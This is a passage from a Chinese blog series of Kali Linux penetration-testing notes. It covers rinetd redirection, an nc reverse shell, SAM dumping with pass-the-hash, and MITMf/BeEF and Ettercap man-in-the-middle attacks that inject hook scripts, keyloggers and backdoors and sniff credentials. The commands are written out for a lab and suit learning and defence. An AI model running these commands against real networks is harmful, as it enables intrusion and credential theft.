<li>渗透测试中经常遇到访问受限的网络环境<ul>
<li>防火墙/交换机，端口映射相比于主机直接外网访问更安全</li>
<li>DNS，TCP/UDP的53端口，基本不过滤</li>
<li>SSH，22端口，基本不过滤</li>
<li>通过与家里的电脑进行连接，达到可以访问其他网络资源的结果</li>
</ul>
</li>
<li>使用隐蔽的手段逃避安全检查措施和朔源追踪<ul>
<li>使明文传输的内容变成加密的内容，躲避安全检查</li>
<li>跳转攻击源头难以追踪，使用肉鸡进行攻击</li>
</ul>
</li>
<li>证明看似严格的访问控制仍然存在弱点</li>
<li>在非受信任的网络中实现安全的数据传输<ul>
<li>难以规避非受信任网络的中间人攻击（arp地址欺骗）</li>
<li>通过与信任的节点进行连接，加密数据，达到数据转发传输的结果</li>
</ul>
</li>
<li>部分概念的实现过程略有烧脑</li>
</ul>
<h4 id="2-流量操控技术"><a href="#2-流量操控技术" class="headerlink" title="2. 流量操控技术"></a>2. 流量操控技术</h4><ul>
<li>重定向（Redirection）<ul>
<li>IP、Port</li>
<li>不进行加密处理，只是作为中间转发</li>
</ul>
</li>
<li>隧道（Tunneling）<ul>
<li>在不受信任的网络环境中实现安全的通信（两个节点之间的加密流量传输）</li>
<li>通常使用多种加密技术建立通信隧道</li>
<li>点到点（IP2IP）、端到端（Port2Port）<ul>
<li>点到点的安全只有在隧道之间，内网的传输是明文</li>
<li>端到端是两个进程之间的加密，基本不存在中间人攻击</li>
</ul>
</li>
<li>VPN<ul>
<li>pptp（不太安全技术，客户端到目标网络，▲过程有几个明文传输）</li>
<li>l2tp（二层VPN技术，客户端到目标网络）</li>
<li>IPSec（安全性首选，站点到站点）</li>
<li>SSL vpn（端到端的VPN，客户端使用连接服务器）</li>
<li>SSH</li>
</ul>
</li>
</ul>
</li>
<li>封装（encapsulation）<ul>
<li>通常结合在隧道中使用，使用一种协议封装一种协议（RPC o http、VoIP）</li>
<li>使用网关设备实现不同类型网络的互联互通</li>
</ul>
</li>
</ul>
<h4 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3. 重定向"></a>3. 重定向</h4><ul>
<li>Rinetd<ul>
<li>安装：<strong><code>🔺命令：apt-get install rinetd</code></strong></li>
<li>配置：/etc/rinetd.conf（bindaddress bindport connectaddress connectport）</li>
<li>运行：<strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>应用场景<ul>
<li>重定向web流量，突破上网限制</li>
<li>远程桌面重定向</li>
<li>Nc重定向获得Shell</li>
<li>不兼容FTP等二次连接的协议</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6f718p4gikJ1DMU67m0OI1iMS0EMZMo-Ixr2O-oucAPsPTtvy7ZMXP01Ua3P2CAwfD0wwWfeQknbUKQiMq5D5HbYY_RDRPo1R1Mx6R2ysnNVOOxXyk-QVjiL&file_name=/%E9%87%8D%E5%AE%9A%E5%90%91.PNG" alt="重定向"></p>
<h4 id="4-80端口Web服务访问"><a href="#4-80端口Web服务访问" class="headerlink" title="4. 80端口Web服务访问"></a>4. 80端口Web服务访问</h4><ul>
<li>安装monowall防火墙<ul>
<li>需要两块网卡，第一块网卡为连接内网的Host-Only网卡，第二块为连接外网的桥接网卡</li>
<li>安装光盘放进去ISO文件</li>
<li>选择7，Install on Hard Drive，安装在硬盘上</li>
<li>输入设备ad0</li>
<li>重启并拔出ISO光盘</li>
</ul>
</li>
<li>monowall防火墙配置<ul>
<li>硬盘启动</li>
<li>选择1，指定网卡接口，不需要vlan</li>
<li>输入LAN局域网接口em0，输入WAN广域网接口em1，无需其他的端口设置</li>
<li>重启设备</li>
</ul>
</li>
<li>monowall再配置<ul>
<li>硬盘启动</li>
<li>选择2，指定局域网IP地址，子网掩码（bit数），DHCP服务</li>
<li>选择3，重置webGUI界面，重置为mono</li>
<li>选择5，重启mono</li>
</ul>
</li>
<li>开启一台win xp sp3电脑<ul>
<li>选择Host-only网络</li>
<li>ifconfig/进行ping通信、上网尝试</li>
</ul>
</li>
<li>进入monowall防火墙管理界面<ul>
<li>Rules，初始规则为LAN → Any</li>
<li>删除默认规则，进行外网访问尝试</li>
<li>新建一条规则，Action → Pass，Protocol → TCP/UDP，Destination port range → DNS</li>
<li>Apply进行应用</li>
</ul>
</li>
<li>Kali网络设置为桥接<ul>
<li>需要访问墙外流量</li>
<li><strong><code>🔺命令：apt-get install rinetd</code></strong></li>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置）<ul>
<li>bindaddress（本机侦听IP）</li>
<li>bindport（本机侦听端口）</li>
<li>connectaddress（连接IP）</li>
<li>connectport（侦听的端口）</li>
</ul>
</li>
<li>rinetd</li>
</ul>
</li>
<li>Window Server 2003网络设置为桥接<ul>
<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>Win xp访问Kali主机IP的53端口</li>
</ul>
<h4 id="5-3389端口远程桌面访问"><a href="#5-3389端口远程桌面访问" class="headerlink" title="5. 3389端口远程桌面访问"></a>5. 3389端口远程桌面访问</h4><ul>
<li>Kali设置<ul>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3389端口</li>
<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
<li><strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>Win xp访问远程桌面<ul>
<li>Win+R → mstsc → Kali主机IP的53端口</li>
<li>尝试登陆，ifconfig</li>
</ul>
</li>
</ul>
<h4 id="6-NC获取shell"><a href="#6-NC获取shell" class="headerlink" title="6. NC获取shell"></a>6. NC获取shell</h4><ul>
<li>思想：XP执行NC把自己的Shell发给Kali的53端口，转发给Window Server 2003，在Window Server 2003用nc来接受Shell</li>
<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /root/Desktop</code></strong>（拷贝到XP和2003的机子上）</li>
<li>Window Server 2003<ul>
<li><strong><code>🔺命令：cmd → nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>Kali设置<ul>
<li><strong><code>🔺命令：vi /etc/rinetd.conf</code></strong>（指向的配置），修改connectport为3333端口</li>
<li><strong><code>🔺命令：pkill rinetd</code></strong></li>
<li><strong><code>🔺命令：rinetd</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc Kali的IP地址 53 -e cmd</code></strong></li>
</ul>
</li>
<li>Window Server 2003进行ipconfig</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%9B%9B)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%BC%A0%E9%80%92Hash%E5%80%BC/" itemprop="url">Kali Linux笔记(六十四)：密码嗅探--传递Hash值</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  161 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Pass-the-Hash（PTH）"><a href="#1-Pass-the-Hash（PTH）" class="headerlink" title="1. Pass the Hash（PTH）"></a>1. Pass the Hash（PTH）</h4><ul>
<li>密码破解耗费时间资源巨大 </li>
<li>使用密文提交给服务器直接完成身份认证 </li>
<li>NTLM/LM是没有加严的静态HASH密文（▲传输密文每次都是一样的）</li>
<li>企业中使用ghost等工具克隆安装系统</li>
<li>操作<ul>
<li>Win7插入一个Kali光盘，用光盘启动</li>
<li><strong><code>🔺命令：mount /dev/sda2 /mnt</code></strong></li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32/config</code></strong></li>
<li><strong><code>🔺命令：samdump2 SYSTEM SAM</code></strong></li>
<li>使用nc传递HASH值</li>
<li>Win7光盘释放重启，关闭Win7防火墙</li>
<li><strong><code>🔺命令：pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8（用户名密码用%分卡） //Win7IP地址1.1.1.1 cmd</code></strong></li>
</ul>
</li>
<li>▲ 只适用于Window系统</li>
<li>▲ 2020.1.27 CreateService failed. NT_STATUS_ACCESS_DENIED</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(六十三)：密码嗅探--中间人攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--ARP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97%E3%80%81DNS%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97/" itemprop="url">Kali Linux笔记(六十二)：密码嗅探--ARP地址欺骗、DNS代理欺骗</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
                2020-01-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  808 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-密码嗅探"><a href="#1-密码嗅探" class="headerlink" title="1. 密码嗅探"></a>1. 密码嗅探</h4><ul>
<li>二、三层地址<ul>
<li>IP网络到网络</li>
<li>MAC主机到主机（硬件固化地址，广播寻址）</li>
<li>▲ 路由器不转发广播</li>
<li>▲ 局域网内MAC寻址，广域网IP寻址</li>
</ul>
</li>
<li>交换机与HUB<ul>
<li>▲ HUB是物理层的设备，非二层设备，不识别MAC地址</li>
<li>HUB全端口转发，只要有数据包就转发给本网络所有主机（不安全）</li>
<li>交换机根据学习地址转发，形成APR地址列表</li>
<li>混杂模式抓包</li>
</ul>
</li>
